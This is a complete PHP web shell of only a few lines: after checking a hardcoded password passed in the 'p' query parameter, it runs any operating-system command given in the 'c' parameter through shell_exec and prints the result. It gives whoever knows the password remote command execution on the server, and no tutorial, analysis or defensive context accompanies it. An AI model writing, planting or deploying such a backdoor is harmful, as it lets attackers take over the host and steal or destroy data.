<?php
if ($_GET['p'] != "example"){
  die;
}
$out=shell_exec($_GET['c']);
echo $out;
?>
